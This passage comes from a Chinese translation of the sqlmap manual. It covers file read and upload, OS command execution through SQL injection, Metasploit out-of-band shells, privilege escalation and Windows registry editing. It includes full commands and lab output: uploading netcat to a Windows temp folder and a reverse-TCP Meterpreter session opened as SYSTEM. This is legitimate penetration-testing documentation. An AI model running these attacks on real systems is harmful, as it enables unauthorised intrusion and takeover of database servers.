<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.136.129/sqlmap/mssql/iis/get_str2.asp?name=luther&quot;</span> --<span class="hljs-keyword">file</span>-<span class="hljs-keyword">read</span> <span class="hljs-string">&quot;C:/example.exe&quot;</span> -v <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[hh:mm:49] [<span class="hljs-built_in">INFO</span>] the back-end DBMS is Microsoft SQL<span class="hljs-built_in"> Server</span><br><span class="hljs-built_in"></span>web<span class="hljs-built_in"> server </span>operating system: Windows 2000<br>web application technology: ASP.NET, Microsoft IIS 6.0, ASP<br>back-end DBMS: Microsoft SQL<span class="hljs-built_in"> Server </span>2005<br>[hh:mm:50] [<span class="hljs-built_in">INFO</span>] fetching file: <span class="hljs-string">&#x27;C:/example.exe&#x27;</span><br>[hh:mm:50] [<span class="hljs-built_in">INFO</span>] the SQL query provided returns 3 entries<br>C:/example.exe file saved <span class="hljs-keyword">to</span>:<br><span class="hljs-string">&#x27;/software/sqlmap/output/192.168.136.129/files/C__example.exe&#x27;</span><br></code></pre></td></tr></table></figure>
<p>然后查看下载的文件：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> output/<span class="hljs-number">192.168</span>.<span class="hljs-number">136.129</span>/<span class="hljs-keyword">files</span>/C__example.<span class="hljs-keyword">exe</span><br>-rw-r--r-- <span class="hljs-number">1</span> inquis inquis <span class="hljs-number">2560</span> <span class="hljs-number">2011</span>-MM-DD hh:mm output/<span class="hljs-number">192.168</span>.<span class="hljs-number">136.129</span>/<span class="hljs-keyword">files</span>/C__example.<span class="hljs-keyword">exe</span><br>$ <span class="hljs-keyword">file</span> output/<span class="hljs-number">192.168</span>.<span class="hljs-number">136.129</span>/<span class="hljs-keyword">files</span>/C__example.<span class="hljs-keyword">exe</span><br>output/<span class="hljs-number">192.168</span>.<span class="hljs-number">136.129</span>/<span class="hljs-keyword">files</span>/C__example.<span class="hljs-keyword">exe</span>: PE32 <span class="hljs-built_in">executable</span> <span class="hljs-keyword">for</span> MS Windows (GUI) Intel <span class="hljs-number">80386</span> <span class="hljs-number">32</span>-bit<br></code></pre></td></tr></table></figure>
<h4 id="上传文件">上传文件</h4>
<blockquote>
<p>参数：<code>--file-write</code> 和<code>--file-dest</code></p>
</blockquote>
<p>当数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有写文件相关权限时上传文件是可行的。<br />
上传的文件既可以是文件文件也可以是二进制文件，Sqlmap 会处理好的。下例的目标数据库管理系统是 MySQL，上传了一个二进制的 UPX 压缩文件：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ <span class="hljs-keyword">file</span> /software/nc.<span class="hljs-keyword">exe</span>.packed<br>/software/nc.<span class="hljs-keyword">exe</span>.packed: PE32 <span class="hljs-built_in">executable</span> <span class="hljs-keyword">for</span> MS Windows (console) Intel <span class="hljs-number">80386</span> <span class="hljs-number">32</span>-bit<br>$ <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> /software/nc.<span class="hljs-keyword">exe</span>.packed<br>-rwxr-xr-<span class="hljs-keyword">x</span> <span class="hljs-number">1</span> inquis inquis <span class="hljs-number">31744</span> <span class="hljs-number">2009</span>-MM-DD hh:mm /software/nc.<span class="hljs-keyword">exe</span>.packed<br>$ <span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1&quot;</span> -\<br>-<span class="hljs-keyword">file</span>-<span class="hljs-keyword">write</span> <span class="hljs-string">&quot;/software/nc.exe.packed&quot;</span> --<span class="hljs-keyword">file</span>-dest <span class="hljs-string">&quot;C:/WINDOWS/Temp/nc.exe&quot;</span> -v <span class="hljs-number">1</span><br>[...]<br>[hh:mm:<span class="hljs-number">29</span>] [INFO] the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web server operating <span class="hljs-built_in">system</span>: Windows <span class="hljs-number">2003</span> <span class="hljs-built_in">or</span> <span class="hljs-number">2008</span><br>web application technology: ASP.NET, Microsoft IIS <span class="hljs-number">6.0</span>, ASP.NET <span class="hljs-number">2.0</span>.<span class="hljs-number">50727</span><br>back-end DBMS: MySQL &gt;= <span class="hljs-number">5.0</span>.<span class="hljs-number">0</span><br>[...]<br><span class="hljs-keyword">do</span> you want confirmation that the <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;C:/WINDOWS/Temp/nc.exe&#x27;</span> <span class="hljs-built_in">has</span> been success<br>fully written <span class="hljs-keyword">on</span> the back-end DBMS <span class="hljs-keyword">file</span> <span class="hljs-built_in">system</span>? [Y/n] <span class="hljs-keyword">y</span><br>[hh:mm:<span class="hljs-number">52</span>] [INFO] retrieved: <span class="hljs-number">31744</span><br>[hh:mm:<span class="hljs-number">52</span>] [INFO] the <span class="hljs-keyword">file</span> <span class="hljs-built_in">has</span> been successfully written <span class="hljs-built_in">and</span> its size <span class="hljs-keyword">is</span> <span class="hljs-number">31744</span> <span class="hljs-keyword">b</span><br>ytes, same size <span class="hljs-keyword">as</span> the local <span class="hljs-keyword">file</span> <span class="hljs-string">&#x27;/software/nc.exe.packed&#x27;</span><br></code></pre></td></tr></table></figure>
<h3 id="操作系统控制">操作系统控制</h3>
<h4 id="执行任意操作系统命令">执行任意操作系统命令</h4>
<blockquote>
<p>参数：<code>--os-cmd</code> 和<code>--os-shell</code></p>
</blockquote>
<p>若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就能利用 SQL 注入执行任意的操作系统命令。</p>
<p>当数据库管理系统是 MySQL 或 PostgreSQL 时，Sqlmap 会通过前面介绍过的文件上传功能上传一个包含用户自定义函数 sys_exec()和 sys_eval()的二进制共享库文件，然后创建这两个用户自定义函数，通过这两个函数之一来执行用户指定的命令。选择哪个函数取决于用户是否想要显示命令执行的标准输出。</p>
<p>当数据库管理系统是微软的 SQL Server 时，Sqlmap 通过存储过程 xp_cmdshell 来执行任意命令。<br />
若 xp_cmdshell 被禁用（SQL Server &gt;= 2005 时默认禁用）Sqlmap 会启用它；<br />
若 xp_cmdshell 不存在，Sqlmap 会创建它。</p>
<p>当用户想要看到命令执行的标准输出时，Sqlmap 使用可列举的注入技术（盲注、带内和基于错误的注入），而当用户不想看到命令执行的标准输出时，堆查询注入技术将被用于执行命令。</p>
<p>下例的目标是 PostgreSQL：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot;</span> --os-<span class="hljs-keyword">cmd</span><span class="language-bash"> <span class="hljs-built_in">id</span> -v 1</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">web application technology: PHP 5.2.6, Apache 2.2.9<br>back-end DBMS: PostgreSQL<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] fingerprinting the back-end DBMS operating<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] the back-end DBMS operating<span class="hljs-built_in"> system </span>is Linux<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">if</span> current<span class="hljs-built_in"> user </span>is DBA<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] detecting back-end DBMS version <span class="hljs-keyword">from</span> its banner<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">&#x27;sys_eval&#x27;</span> already exist<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">&#x27;sys_exec&#x27;</span> already exist<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] creating UDF <span class="hljs-string">&#x27;sys_eval&#x27;</span> <span class="hljs-keyword">from</span> the binary UDF file<br>[hh:mm:12] [<span class="hljs-built_in">INFO</span>] creating UDF <span class="hljs-string">&#x27;sys_exec&#x27;</span> <span class="hljs-keyword">from</span> the binary UDF file<br><span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> retrieve the command standard output? [Y/n/a] y<br>command standard output:<br><span class="hljs-string">&#x27;uid=104(postgres) gid=106(postgres) groups=106(postgres)&#x27;</span><br>[hh:mm:19] [<span class="hljs-built_in">INFO</span>] cleaning up the database management<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span><span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-built_in">remove</span> UDF <span class="hljs-string">&#x27;sys_eval&#x27;</span>? [Y/n] y<br><span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> <span class="hljs-built_in">remove</span> UDF <span class="hljs-string">&#x27;sys_exec&#x27;</span>? [Y/n] y<br>[hh:mm:23] [<span class="hljs-built_in">INFO</span>] database management<span class="hljs-built_in"> system </span>cleanup finished<br>[hh:mm:23] [<span class="hljs-built_in">WARNING</span>] remember that UDF shared object files saved on the file<span class="hljs-built_in"> system </span>can only be deleted manually<br></code></pre></td></tr></table></figure>
<p>使用参数<code>--os-shell</code>可以模拟一个可以执行任意命令的 shell，和<code>--sql-shell</code>一样这个 shell 也可以用 Tab 键补全，支持历史记录。</p>
<p>当堆查询不被支持（如 PHP 或 ASP+Mysql）且数据库管理系统是 MySQL 时，仍然可以通过 SELECT 的从句 INTO OUTFILE 在 Web 所在主机的可写目录创建一个 Web 后门，通过这个 Web 后门来执行命令。Sqlmap 支持这一技术并要求用户提供一些用逗号分割的可能是可写目录的路径。Sqlmap 支持以下这些服务器端脚本语言：</p>
<p>ASP<br />
ASP.NET<br />
JSP<br />
PHP</p>
<h4 id="带外-tcp-连接meterpreter-及相关">带外 TCP 连接：Meterpreter 及相关</h4>
<blockquote>
<p>参数：<code>--os-pwn</code>、<code>--os-smbrelay</code>、<code>--os-bof</code>、<code>--priv-esc</code>、<code>--msf-path</code> 和<code>--tmp-path</code></p>
</blockquote>
<p>若数据库管理系统是 MySQL、PostgreSQL 或微软的 SQL Server 且当前用户有相关权限 Sqlmap 就有可能在攻击者的主机和数据库所在主机之间建立带外 TCP 连接。根据用户的选择，此连接可以是交互式命令 shell，Meterpreter 会话或图形用户界面（VNC）会话。</p>
<p>Sqlmap 要靠 Metasploit 生成 shellcode，在数据库所在主机执行 shellcode 有以下四种技术：</p>
<ul>
<li>数据库通过 Sqlmap 创建的用户自定义函数 sys_bineval()在内存中执行 Metasploit 的 shellcode。支持 MySQL 和 PostgreSQL。参数<code>--os-pwn</code>。</li>
<li>通过 Sqlmap 自己的用户自定义函数（MySQL 和 PostgreSQL 中的 sys_exec()，微软 SQL Server 中的 xp_cmdshell()）上传并执行 Metasploit 的<code>stand-alone payload stager</code>。参数：<code>--os-pwn</code>。</li>
<li>利用远程代码执行漏洞<a target="_blank" rel="noopener" href="http://blog.csdn.net/wn314/article/details/www.microsoft.com/technet/security/Bulletin/MS08-068.mspx">MS08-068</a>。攻击者的机器要用 Metasploit 的 smb_relay 监听来自目标机器的连接。要求在 Linux/Unix 上以 root 权限运行 Sqlmap 且目标 DBMS 在 Windows 上以管理员权限运行。参数：<code>--os-smbrelay</code>。</li>
<li>在微软 SQL Server 2000 和 2005 中可通过存储过程 sp_replwritetovarbin 的堆缓冲区溢出漏洞（<a target="_blank" rel="noopener" href="https://technet.microsoft.com/library/security/ms09-004">MS09-004</a>）在内存中执行 Metasploit 的 shellcode。Sqlmap 有自己的数据执行保护绕过技术可以成功利用漏洞，但需要 Metasploit 生成 shellcode 以便在成功利用漏洞时执行 shellcode。参数：<code>--os-bof</code>。</li>
</ul>
<p>下面是以 MySQL 为目标的例子：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python sqlmap.py -u <span class="hljs-string">&quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot;</span> --os-pwn --msf-path /software/metasploit<br><br>[<span class="hljs-built_in">..</span>.]<br>[hh:mm:31] [<span class="hljs-built_in">INFO</span>] the back-end DBMS is MySQL<br>web<span class="hljs-built_in"> server </span>operating system: Windows 2003<br>web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0<br>back-end DBMS: MySQL 5.0<br>[hh:mm:31] [<span class="hljs-built_in">INFO</span>] fingerprinting the back-end DBMS operating<span class="hljs-built_in"> system</span><br><span class="hljs-built_in"></span>[hh:mm:31] [<span class="hljs-built_in">INFO</span>] the back-end DBMS operating<span class="hljs-built_in"> system </span>is Windows<br>how <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> establish the tunnel?<br>[1] TCP: Metasploit Framework (default)<br>[2] ICMP: icmpsh - ICMP tunneling<br>&gt;<br>[hh:mm:32] [<span class="hljs-built_in">INFO</span>] testing <span class="hljs-keyword">if</span> current<span class="hljs-built_in"> user </span>is DBA<br>[hh:mm:32] [<span class="hljs-built_in">INFO</span>] fetching current<span class="hljs-built_in"> user</span><br><span class="hljs-built_in"></span>what is the back-end database management<span class="hljs-built_in"> system </span>architecture?<br>[1] 32-bit (default)<br>[2] 64-bit<br>&gt;<br>[hh:mm:33] [<span class="hljs-built_in">INFO</span>] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">&#x27;sys_bineval&#x27;</span> already exist<br>[hh:mm:33] [<span class="hljs-built_in">INFO</span>] checking <span class="hljs-keyword">if</span> UDF <span class="hljs-string">&#x27;sys_exec&#x27;</span> already exist<br>[hh:mm:33] [<span class="hljs-built_in">INFO</span>] detecting back-end DBMS version <span class="hljs-keyword">from</span> its banner<br>[hh:mm:33] [<span class="hljs-built_in">INFO</span>] retrieving MySQL base directory absolute path<br>[hh:mm:34] [<span class="hljs-built_in">INFO</span>] creating UDF <span class="hljs-string">&#x27;sys_bineval&#x27;</span> <span class="hljs-keyword">from</span> the binary UDF file<br>[hh:mm:34] [<span class="hljs-built_in">INFO</span>] creating UDF <span class="hljs-string">&#x27;sys_exec&#x27;</span> <span class="hljs-keyword">from</span> the binary UDF file<br>how <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> execute the Metasploit shellcode on the back-end database und<br>erlying operating system?<br>[1] Via UDF <span class="hljs-string">&#x27;sys_bineval&#x27;</span> (in-memory way, anti-forensics, default)<br>[2] Stand-alone payload stager (file<span class="hljs-built_in"> system </span>way)<br>&gt;<br>[hh:mm:35] [<span class="hljs-built_in">INFO</span>] creating Metasploit Framework multi-stage shellcode<br>which<span class="hljs-built_in"> connection type </span><span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> use?<br>[1] Reverse TCP: Connect back <span class="hljs-keyword">from</span> the database host <span class="hljs-keyword">to</span> this machine (default)<br>[2] Reverse TCP: Try <span class="hljs-keyword">to</span> connect back <span class="hljs-keyword">from</span> the database host <span class="hljs-keyword">to</span> this machine, on<br>all ports<br>between the specified <span class="hljs-keyword">and</span> 65535<br>[3] Bind TCP: Listen on the database host <span class="hljs-keyword">for</span> a<span class="hljs-built_in"> connection</span><br><span class="hljs-built_in"></span>&gt;<br>which is the local address? [192.168.136.1]<br>which local<span class="hljs-built_in"> port </span>number <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> use? [60641]<br>which payload <span class="hljs-keyword">do</span> you want <span class="hljs-keyword">to</span> use?<br>[1] Meterpreter (default)<br>[2] Shell<br>[3] VNC<br>&gt;<br>[hh:mm:40] [<span class="hljs-built_in">INFO</span>] creation <span class="hljs-keyword">in</span> progress <span class="hljs-built_in">..</span>. done<br>[hh:mm:43] [<span class="hljs-built_in">INFO</span>] running Metasploit Framework command line<span class="hljs-built_in"> interface </span>locally, please wait<span class="hljs-built_in">..</span><br><br>=[ metasploit v3.7.0-dev [core:3.7 api:1.0]<br>+ -- --=[ 674 exploits - 351 auxiliary<br>+ -- --=[ 217 payloads - 27 encoders - 8 nops<br>=[ svn r12272 updated 4 days ago (2011.04.07)<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>EXITFUNC =&gt; thread<br>LPORT =&gt; 60641<br>LHOST =&gt; 192.168.136.1<br>[*] Started reverse handler on 192.168.136.1:60641<br>[*] Starting the payload handler<span class="hljs-built_in">..</span>.<br>[hh:mm:48] [<span class="hljs-built_in">INFO</span>] running Metasploit Framework shellcode remotely via UDF <span class="hljs-string">&#x27;sys_bineval&#x27;</span>, please wait<span class="hljs-built_in">..</span><br>[*] Sending stage (749056 bytes) <span class="hljs-keyword">to</span> 192.168.136.129<br>[*] Meterpreter session 1 opened (192.168.136.1:60641 -&gt; 192.168.136.129:1689) at Mon Apr 11 hh:mm:52 +0100 2011<br>meterpreter &gt; Loading extension espia<span class="hljs-built_in">..</span>.success.<br>meterpreter &gt; Loading extension incognito<span class="hljs-built_in">..</span>.success.<br>meterpreter &gt; [-] The <span class="hljs-string">&#x27;priv&#x27;</span> extension has already been loaded.<br>meterpreter &gt; Loading extension sniffer<span class="hljs-built_in">..</span>.success.<br>meterpreter &gt;<span class="hljs-built_in"> System </span>Language : en_US<br>OS            : Windows .NET<span class="hljs-built_in"> Server </span>(Build 3790,<span class="hljs-built_in"> Service </span>Pack 2).<br>Computer      : W2K3R2<br>Architecture  : x86<br>Meterpreter   : x86/win32<br>meterpreter &gt;<span class="hljs-built_in"> Server </span>username: NT AUTHORITY\SYSTEM<br>meterpreter &gt; ipconfig<br><br>MS TCP Loopback<span class="hljs-built_in"> interface</span><br><span class="hljs-built_in">Hardware </span>MAC: 00:00:00:00:00:00<span class="hljs-built_in"></span><br><span class="hljs-built_in">IP Address </span>: 127.0.0.1<br>Netmask    : 255.0.0.0<br><br>Intel(R) PRO/1000 MT<span class="hljs-built_in"> Network Connection</span><br><span class="hljs-built_in">Hardware </span>MAC: 00:0c:29:fc:79:39<span class="hljs-built_in"></span><br><span class="hljs-built_in">IP Address </span>: 192.168.136.129<br>Netmask    : 255.255.255.0<br><br>meterpreter &gt; exit<br>[*] Meterpreter session 1 closed. Reason:<span class="hljs-built_in"> User </span>exit<br></code></pre></td></tr></table></figure>
<p>在 Windows 中 Mysql 默认以 SYSTEM 身份运行，但 PostgreSQL 无论是在 Windows 还是在 Linux 中都以低权限的用户 postgres 运行。SQL Server 2000 默认以 SYSTEM 身份运行，但 SQL Server 2005 到 2008 大多数时间以 NETWORK SERVICE 身份运行，少数时候以 LOCAL SERVICE 身份运行。</p>
<p>使用参数<code>--priv-esc</code>可以执行 Metasploit 的 getsystem 命令以尝试提升权限。</p>
<h3 id="windows-注册表操作">Windows 注册表操作</h3>
<p>满足以下条件就可以对 Windows 注册表进行操作：</p>
<ul>
<li>目标数据库管理系统是运行在 Windows 上的</li>
<li>目标数据库管理系统是 MySQL、PostgreSQL 或微软 SQL Server</li>
<li>支持堆查询</li>
<li>目标数据库管理系统当前用户有足够的权限</li>
</ul>
<h4 id="读-windows-注册表键值">读 Windows 注册表键值</h4>
<blockquote>
<p>参数：<code>--reg-read</code></p>
</blockquote>
<h4 id="写-windows-注册表键值">写 Windows 注册表键值</h4>
<blockquote>
<p>参数：<code>--reg-add</code></p>
</blockquote>
<h4 id="删除-windows-注册表键值">删除 Windows 注册表键值</h4>
<blockquote>
<p>参数：<code>--reg-del</code></p>
</blockquote>
<h4 id="辅助">辅助</h4>
<blockquote>
<p>参数：<code>--reg-key</code>、<code>--reg-value</code>、<code>--reg-data</code> 和<code>--reg-type</code></p>
</blockquote>
<p>适当使用上列参数就可以在命令中添加或修改一个 Windows 注册表键值而不用在 Sqlmap 运行时以问答方式提供数据。</p>
<ul>
<li><code>--reg-key</code>：指定 Windows 注册表键值的路径</li>
<li><code>--reg-value</code>：指定 Windows 注册表键值的键</li>
<li><code>--reg-data</code>：指定 Windows 注册表键值的值</li>
<li><code>--reg-type</code>：指定 Windows 注册表键值的值的数据类型</li>
</ul>
<p>下面是一个例子：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://<span class="hljs-number">192.168</span>.<span class="hljs-number">136.129</span>/sqlmap/pgsql/get_int.aspx?id=<span class="hljs-number">1</span> --<span class="hljs-keyword">reg</span>-<span class="hljs-built_in">add</span> --<span class="hljs-keyword">reg</span>-key=<span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot;</span> --<span class="hljs-keyword">reg</span>-value=Test --<span class="hljs-keyword">reg</span>-<span class="hljs-built_in">type</span>=REG_SZ --<span class="hljs-keyword">reg</span>-data=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<h2 id="通用选项">通用选项</h2>
<h3 id="杂项">杂项</h3>
<h4 id="从-sqlite-文件中载入-sqlmap-会话">从 SQLite 文件中载入 Sqlmap 会话</h4>
<blockquote>
<p>参数：-s</p>
</blockquote>
<p>Sqlmap 会自动地为每一个目标创建长久保存的会话 SQLite 文件，该文件统一存储在特定目录（如：<code>~/.sqlmap/output/</code>）中，其中保存着恢复会话所需的所有数据。若用户想要明确地指定 SQLite 文件（例如想要将多个目标的数据存储到同一个 SQLite 文件中），可使用此参数。</p>
<h4 id="将-https流量记录到日志文件中">将 HTTP(S)流量记录到日志文件中</h4>
<blockquote>
<p>参数：-t</p>
</blockquote>
<p>该参数后跟一个文件路径，用于将 HTTP(S)请求和响应以文本格式记录到文件中作为日志。这样的日志在调试时是很有用的。</p>
<h4 id="非交互模式">非交互模式</h4>
<blockquote>
<p>参数：<code>--batch</code></p>
</blockquote>
<p>使用该参数可以让 Sqlmap 以非交互模式运行，所有要求的输入都会取默认值。</p>
<h4 id="设置字符编码">设置字符编码</h4>
<blockquote>
<p>参数：<code>--charset</code></p>
</blockquote>
<p>为正确解码数据，Sqlmap 会使用 Web 服务器提供的信息（如 HTTP 头部中字符编码的设置），或是使用第三方库<a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/chardet">chardet</a>来启发式地确定字符编码。</p>
<p>可以使用参数<code>--charset</code>来指定字符编码，如<code>--charset=GBK</code>。</p>
<h4 id="从目标-url-开始爬取目标站点">从目标 URL 开始爬取目标站点</h4>
<blockquote>
<p>参数：<code>--crawl</code></p>
</blockquote>
<p>Sqlmap 可以从目标 URL 开始爬取目标站点并收集可能存在漏洞的 URL。使用该参数还需要设置爬取深度，深度是相对于开始爬取的目标 URL 而言的。只有所有新链接都被递归地访问过后才算爬取结束。建议该参数与<code>--delay</code>配合使用。</p>
<p>下例的目标的 MySQL：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://192.168.21.128/sqlmap/mysql/&quot;</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--crawl</span>=<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
<p>部分输出如下：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[xx:xx:53]</span> <span class="hljs-selector-attr">[INFO]</span> starting crawler<br><span class="hljs-selector-attr">[xx:xx:53]</span> <span class="hljs-selector-attr">[INFO]</span> searching <span class="hljs-keyword">for</span> links with depth <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[xx:xx:53]</span> <span class="hljs-selector-attr">[WARNING]</span> running <span class="hljs-keyword">in</span> <span class="hljs-selector-tag">a</span> single-thread mode. This could take <span class="hljs-selector-tag">a</span> while<br><span class="hljs-selector-attr">[xx:xx:53]</span> <span class="hljs-selector-attr">[INFO]</span> searching <span class="hljs-keyword">for</span> links with depth <span class="hljs-number">2</span><br><span class="hljs-selector-attr">[xx:xx:54]</span> <span class="hljs-selector-attr">[INFO]</span> heuristics detected web <span class="hljs-attribute">page</span> charset <span class="hljs-string">&#x27;ascii&#x27;</span><br><span class="hljs-selector-attr">[xx:xx:00]</span> <span class="hljs-selector-attr">[INFO]</span> <span class="hljs-number">42</span>/<span class="hljs-number">56</span> links visited (<span class="hljs-number">75%</span>)<br></code></pre></td></tr></table></figure>
<p>参数：<code>--crawl-exclude</code></p>
<p>在此参数后跟一个正则表达式可以排除不想爬取的 URL。若 URL 匹配正则，则不被爬取。如用<code>--crawl-exclude=logout</code>来排除所有含有字符串<code>logout</code>的 URL。</p>
<h4 id="设置输出-csv-文件中的分隔符">设置输出 CSV 文件中的分隔符</h4>
<blockquote>
<p>参数：<code>--csv-del</code></p>
</blockquote>
<p>当数据被输出到 CSV 文件（<code>--dump-format=CSV</code>）时，默认以<code>,</code>分隔，可以使用此参数指定分隔符。如：<code>--csv-del=";"</code>。</p>
<h4 id="数据库管理系统认证凭据">数据库管理系统认证凭据</h4>
<blockquote>
<p>参数：--dbms-cred</p>
</blockquote>
<p>在某些情况下由于数据库管理系统当前用户权限较低从而导致动作执行失败，此时可以用此参数提供 admin 用户认证凭据，Sqlmap 就会对执行失败的部分特地使用<code>run as</code>机制（如：微软 SQL Server 的 OPENROWSET）以 admin 用户身份重新执行失败的动作。当然，得知道 admin 用户认证凭据才行。</p>
<h4 id="数据输出格式">数据输出格式</h4>
<blockquote>
<p>参数：--dump-format</p>
</blockquote>
<p>Sqlmap 对列举的数据有三种不同的输出格式：CSV、HTML 和 SQLITE。默认为 CSV 格式，每个数据表都被保存到一个文本文件中，一行是一条记录，以逗号分隔（或是用<code>--csv-del</code>指定分隔符）。选择 HTML 格式，所有数据被保存在一个 HTML 文件中，数据存放在一个个 table 中。选择 SQLITE 格式，所有数据被保存在一个 SQLITE 文件中，SQLITE 中表名和结构会和原表相同。</p>
<h4 id="估计完成时间">估计完成时间</h4>
<blockquote>
<p>参数：--eta</p>
</blockquote>
<p>该参数用于显示估计的完成时间。下例是目标为 Oracle 的布尔型盲注：</p>
